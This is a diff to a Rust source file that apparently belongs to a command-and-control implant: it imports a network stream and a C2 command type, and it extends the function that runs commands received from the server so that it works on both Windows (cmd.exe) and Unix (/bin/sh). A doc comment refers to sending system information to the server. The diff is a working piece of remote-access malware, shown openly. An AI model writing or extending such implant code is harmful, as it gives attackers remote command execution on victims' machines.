@@ -2,6 +2,7 @@ use std::io::{self, BufRead, BufReader, Write};
 use std::net::TcpStream;
 use std::process::Command;
 
+
 use crate::config::{Config, C2Command};
 
 
@@ -21,18 +22,39 @@ use crate::config::{Config, C2Command};
 /// A `Result` containing either the command output (stdout) as `Ok(String)`,
 /// or an error message (stderr) as `Err(String)` if the command execution fails.
 pub fn execute_command(cmd: &String) -> Result<String, String> {
-    match Command::new("sh").arg("-c").arg(cmd).output() {
-        Ok(output) => {
-            if output.status.success() {
-                Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
-            } else {
-                Err(String::from_utf8_lossy(&output.stderr).trim().to_string())
+
+
+    let output = if cfg!(windows) {
+        match Command::new("C:\\Windows\\System32\\cmd.exe").arg("/c").arg(cmd).output() {
+            Ok(output) => {
+                if output.status.success() {
+                    Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
+                } else {
+                    Err(String::from_utf8_lossy(&output.stderr).trim().to_string())
+                }
+            },
+            Err(e) => {
+                Err(e.to_string())
             }
-        },
-        Err(e) => {
-            Err(e.to_string())
         }
-    }
+
+    } else {
+        match Command::new("/bin/sh").arg("-c").arg(cmd).output() {
+            Ok(output) => {
+                if output.status.success() {
+                    Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
+                } else {
+                    Err(String::from_utf8_lossy(&output.stderr).trim().to_string())
+                }
+            },
+            Err(e) => {
+                Err(e.to_string())
+            }
+        }
+    };
+
+    output
+
 }
 
 /// Sends system information to the server.
